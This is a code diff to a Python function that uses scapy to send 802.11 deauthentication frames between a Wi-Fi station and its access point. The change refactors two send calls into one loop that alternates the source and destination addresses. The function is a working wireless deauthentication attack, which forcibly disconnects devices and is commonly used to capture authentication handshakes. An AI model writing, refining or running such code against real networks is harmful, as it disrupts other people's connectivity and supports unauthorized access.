@@ -171,12 +171,13 @@ def unicast_deauth_parallel(deauth_config: DeauthConfig, bssid_sta: str,
     """
     try:
         sys.stderr = sys.stdout = None
-        for _ in range(deauth_config.deauth_rounds):
+        addr1, addr2 = bssid_sta, bssid_ap
+        for _ in range(deauth_config.deauth_rounds * 2):
             sendrecv.sendp(
                 dot11.RadioTap() /
                 dot11.Dot11(
-                    addr1=bssid_sta,
-                    addr2=bssid_ap,
+                    addr1=addr1,
+                    addr2=addr2,
                     addr3=bssid_net,
                 ) /
                 dot11.Dot11Deauth(reason=7),
@@ -184,18 +185,7 @@ def unicast_deauth_parallel(deauth_config: DeauthConfig, bssid_sta: str,
                 count=DEAUTH_COUNT,
                 verbose=False,
             )
-            sendrecv.sendp(
-                dot11.RadioTap() /
-                dot11.Dot11(
-                    addr1=bssid_ap,
-                    addr2=bssid_sta,
-                    addr3=bssid_net,
-                ) /
-                dot11.Dot11Deauth(reason=7),
-                iface=deauth_config.wifi_interface,
-                count=DEAUTH_COUNT,
-                verbose=False,
-            )
+            addr1, addr2 = addr2, addr1
     except Exception as e:
         raise MsgException('unicast deauthentication frames could not be sent') from e
 
